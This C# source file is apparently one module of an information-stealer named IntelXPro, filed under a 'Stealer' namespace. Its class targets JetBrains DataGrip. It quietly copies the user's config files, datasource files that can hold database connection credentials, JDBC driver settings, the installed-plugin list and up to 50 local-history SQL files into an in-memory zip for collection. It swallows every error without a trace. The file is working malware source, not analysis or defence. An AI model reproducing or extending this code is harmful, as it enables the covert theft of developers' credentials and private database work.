using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class DataGrip : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string appDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "JetBrains");
            string localAppDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "JetBrains");

            if (!Directory.Exists(appDataPath) && !Directory.Exists(localAppDataPath))
            {
                return;
            }

            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "DataGrip";

            if (Directory.Exists(appDataPath))
            {
                CollectFromDirectory(appDataPath, "DataGrip", zip, counterApplications, isConfig: true);
            }

            if (Directory.Exists(localAppDataPath))
            {
                CollectFromDirectory(localAppDataPath, "DataGrip", zip, counterApplications, isConfig: false);
            }

            if (counterApplications.Files.Count > 0)
            {
                counter.Applications.Add(counterApplications);
            }
        }

        private void CollectFromDirectory(string basePath, string productName, InMemoryZip zip, Counter.CounterApplications counterApplications, bool isConfig)
        {
            try
            {
                string[] directories = Directory.GetDirectories(basePath, productName + "*");
                
                foreach (string versionDir in directories)
                {
                    string versionName = Path.GetFileName(versionDir);
                    
                    if (isConfig)
                    {
                        CollectConfigFiles(versionDir, versionName, zip, counterApplications);
                        CollectDataSources(versionDir, versionName, zip, counterApplications);
                        CollectPlugins(versionDir, versionName, zip, counterApplications);
                    }
                    else
                    {
                        CollectLocalHistory(versionDir, versionName, zip, counterApplications);
                    }
                }
            }
            catch
            {
            }
        }

        private void CollectConfigFiles(string versionDir, string versionName, InMemoryZip zip, Counter.CounterApplications counterApplications)
        {
            try
            {
                string[] configFiles = new string[]
                {
                    "options\\ide.general.xml",
                    "options\\editor.xml",
                    "options\\keymap.xml",
                    "options\\colors.scheme.xml",
                    "options\\ui.lnf.xml",
                    "options\\window.state.xml",
                    "options\\recentProjects.xml",
                    "options\\other.xml"
                };

                foreach (string configFile in configFiles)
                {
                    string fullPath = Path.Combine(versionDir, configFile);
                    if (File.Exists(fullPath))
                    {
                        string zipPath = "Applications\\DataGrip\\" + versionName + "\\config\\" + Path.GetFileName(configFile);
                        zip.AddFile(zipPath, File.ReadAllBytes(fullPath));
                        counterApplications.Files.Add(fullPath + " => " + zipPath);
                    }
                }
            }
            catch
            {
            }
        }

        private void CollectDataSources(string versionDir, string versionName, InMemoryZip zip, Counter.CounterApplications counterApplications)
        {
            try
            {
                string dataSourcesPath = Path.Combine(versionDir, "options");
                if (Directory.Exists(dataSourcesPath))
                {
                    string[] dataSourceFiles = Directory.GetFiles(dataSourcesPath, "*datasource*", SearchOption.TopDirectoryOnly);
                    
                    foreach (string file in dataSourceFiles)
                    {
                        string zipPath = "Applications\\DataGrip\\" + versionName + "\\datasources\\" + Path.GetFileName(file);
                        zip.AddFile(zipPath, File.ReadAllBytes(file));
                        counterApplications.Files.Add(file + " => " + zipPath);
                    }
                }

                string jdbcDriversPath = Path.Combine(versionDir, "jdbc-drivers");
                if (Directory.Exists(jdbcDriversPath))
                {
                    string[] driverFiles = Directory.GetFiles(jdbcDriversPath, "*.xml", SearchOption.AllDirectories);
                    
                    foreach (string file in driverFiles)
                    {
                        string relativePath = file.Substring(jdbcDriversPath.Length + 1);
                        string zipPath = "Applications\\DataGrip\\" + versionName + "\\jdbc-drivers\\" + relativePath;
                        zip.AddFile(zipPath, File.ReadAllBytes(file));
                        counterApplications.Files.Add(file + " => " + zipPath);
                    }
                }
            }
            catch
            {
            }
        }

        private void CollectPlugins(string versionDir, string versionName, InMemoryZip zip, Counter.CounterApplications counterApplications)
        {
            try
            {
                string pluginsPath = Path.Combine(versionDir, "plugins");
                if (Directory.Exists(pluginsPath))
                {
                    string[] pluginDirs = Directory.GetDirectories(pluginsPath);
                    
                    StringBuilder pluginsList = new StringBuilder();
                    pluginsList.AppendLine("Installed Plugins:");
                    pluginsList.AppendLine();
                    
                    foreach (string pluginDir in pluginDirs)
                    {
                        string pluginName = Path.GetFileName(pluginDir);
                        pluginsList.AppendLine("- " + pluginName);
                    }
                    
                    if (pluginDirs.Length > 0)
                    {
                        string zipPath = "Applications\\DataGrip\\" + versionName + "\\plugins_list.txt";
                        zip.AddTextFile(zipPath, pluginsList.ToString());
                        counterApplications.Files.Add(zipPath);
                    }
                }
            }
            catch
            {
            }
        }

        private void CollectLocalHistory(string versionDir, string versionName, InMemoryZip zip, Counter.CounterApplications counterApplications)
        {
            try
            {
                string localHistoryPath = Path.Combine(versionDir, "LocalHistory");
                if (Directory.Exists(localHistoryPath))
                {
                    string[] historyFiles = Directory.GetFiles(localHistoryPath, "*.sql", SearchOption.AllDirectories);
                    
                    int fileCount = 0;
                    foreach (string file in historyFiles.Take(50))
                    {
                        string relativePath = file.Substring(localHistoryPath.Length + 1);
                        string zipPath = "Applications\\DataGrip\\" + versionName + "\\LocalHistory\\" + relativePath;
                        zip.AddFile(zipPath, File.ReadAllBytes(file));
                        counterApplications.Files.Add(file + " => " + zipPath);
                        fileCount++;
                    }
                }
            }
            catch
            {
            }
        }
    }
}
